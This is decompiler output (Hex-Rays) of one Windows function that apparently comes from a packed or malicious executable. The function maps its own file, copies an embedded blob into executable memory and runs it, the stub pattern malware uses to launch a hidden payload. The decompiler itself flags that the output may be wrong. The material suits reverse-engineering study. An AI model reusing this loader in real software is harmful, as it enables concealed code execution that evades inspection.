/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();

//-------------------------------------------------------------------------
// Data declarations

// extern HANDLE (__stdcall *CreateFileMappingW)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);


//----- (13101C50) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int start()
{
  const void *v0; // edi
  void *v1; // eax
  WCHAR v3[194]; // [esp+Ch] [ebp-184h] BYREF
  __int128 savedregs; // [esp+190h] [ebp+0h]

  GetModuleFileNameW(0, v3, 0x184u);
  HIDWORD(savedregs) = CreateFileW(v3, 0x80000000, 0, 0, 3u, 0x80u, 0);
  HIDWORD(savedregs) = CreateFileMappingW((HANDLE)HIDWORD(savedregs), 0, 2u, 0, 0, 0);
  HIDWORD(savedregs) = MapViewOfFile((HANDLE)HIDWORD(savedregs), 4u, 0, 0, 0);
  v0 = (const void *)(HIDWORD(savedregs) + 23552);
  v1 = VirtualAlloc(0, 0xCF5u, 0x1000u, 0x40u);
  qmemcpy(v1, v0, 0xCF5u);
  return ((int (*)(void))v1)();
}
// 13101C8B: bad sp value at call

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
